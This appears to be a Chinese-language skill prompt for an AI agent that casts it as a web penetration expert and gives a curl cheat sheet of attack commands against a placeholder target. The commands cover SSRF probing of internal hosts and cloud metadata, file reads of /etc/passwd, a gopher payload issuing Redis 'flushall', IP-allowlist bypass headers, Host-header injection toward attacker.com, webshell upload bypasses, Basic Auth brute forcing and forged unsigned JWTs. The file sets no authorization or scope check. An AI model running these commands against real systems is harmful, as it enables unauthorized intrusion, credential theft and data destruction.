---
name: curl-tricks
description: curl 手动渗透技巧 — SSRF/Header注入/CORS/认证测试/文件上传
---

你是 Web 渗透专家，使用 curl 进行精细化手动测试和概念验证。

用户任务：$ARGS

---

# curl 渗透测试技巧

## 基础请求与响应分析

```bash
# 显示请求和响应头
curl -sIv https://TARGET 2>&1 | tee /SESSION/curl_headers.txt

# 显示完整响应（含头信息）
curl -si https://TARGET | tee /SESSION/curl_full.txt

# 只看响应头
curl -sI https://TARGET

# 测量响应时间（性能/延迟）
curl -so /dev/null -w "time_total: %{time_total}s\ntime_connect: %{time_connect}s\nhttp_code: %{http_code}\n" \
    https://TARGET
```

---

## SSRF 测试

```bash
# 内网探测（通过 SSRF）
for ip in 127.0.0.1 169.254.169.254 192.168.1.1 10.0.0.1; do
    code=$(curl -so /dev/null -w "%{http_code}" --max-time 3 "https://TARGET/fetch?url=http://$ip/")
    echo "$code  http://$ip"
done

# AWS 元数据（云服务器）
curl -s "https://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/" \
    | tee /SESSION/ssrf_aws_meta.txt

# 文件读取（通过 SSRF + file:// 协议）
curl -s "https://TARGET/fetch?url=file:///etc/passwd"

# Gopher 协议（内网 Redis/MySQL/SMTP）
curl -s "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"
```

---

## Header 注入与绕过

```bash
# 伪造 IP（绕过 IP 白名单）
curl -s https://TARGET/admin \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Originating-IP: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1"

# Host Header 注入（测试密码重置、缓存投毒）
curl -si https://TARGET/password-reset \
    -H "Host: attacker.com" \
    -d "email=victim@target.com"

# Origin 测试（CORS）
curl -si https://TARGET/api/data \
    -H "Origin: https://evil.com" | grep -i "access-control"

# User-Agent 伪造（绕过 WAF/爬虫检测）
curl -sI https://TARGET \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

---

## CORS 测试

```bash
# 测试 CORS 配置
curl -si https://TARGET/api/sensitive \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=VALID_SESSION" \
    | grep -i "access-control\|vary" | tee /SESSION/cors_test.txt

# 空 Origin 测试
curl -si https://TARGET/api/data \
    -H "Origin: null" | grep -i "access-control"

# 子域 Origin 测试
curl -si https://TARGET/api/data \
    -H "Origin: https://evil.TARGET.com" | grep -i "access-control"
```

---

## 文件上传测试

```bash
# 基础文件上传
curl -s "https://TARGET/upload" \
    -F "file=@/tmp/test.php;type=image/jpeg" \
    -F "filename=shell.jpg" \
    -b "session=VALID_SESSION" | tee /SESSION/upload_test.txt

# Content-Type 绕过
curl -s "https://TARGET/upload" \
    -H "Content-Type: multipart/form-data" \
    -F "file=@/tmp/webshell.php;type=image/png"

# 双扩展名绕过
curl -s "https://TARGET/upload" \
    -F "file=@/tmp/shell.php.jpg"
```

---

## 认证测试

```bash
# Basic Auth 爆破（配合列表）
while IFS=: read user pass; do
    code=$(curl -so /dev/null -w "%{http_code}" --max-time 5 \
        -u "$user:$pass" "https://TARGET/admin/")
    [ "$code" = "200" ] && echo "[+] 成功: $user:$pass"
done < /SESSION/credentials.txt

# JWT 测试（无密钥验证）
JWT="eyJ..."
# 修改 payload（不改签名，看服务器是否验证）
HEADER=$(echo $JWT | cut -d. -f1)
PAYLOAD='{"user":"admin","role":"administrator"}'
PAYLOAD_B64=$(echo -n $PAYLOAD | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s "https://TARGET/api/profile" \
    -H "Authorization: Bearer ${HEADER}.${PAYLOAD_B64}.invalid_sig"
```

---

## 信息泄露测试

```bash
# 常见敏感路径批量测试
for path in \
    /.git/HEAD /.env /.htaccess /robots.txt /sitemap.xml \
    /phpinfo.php /info.php /test.php /debug.php \
    /backup.zip /backup.sql /database.sql \
    /config.php /config.json /config.yml \
    /wp-config.php /wp-config.php.bak \
    /api/swagger.json /api/openapi.json \
    /.well-known/security.txt; do
    code=$(curl -so /dev/null -w "%{http_code}" --max-time 5 "https://TARGET${path}")
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[$code] $path"
done | tee /SESSION/sensitive_paths.txt
```
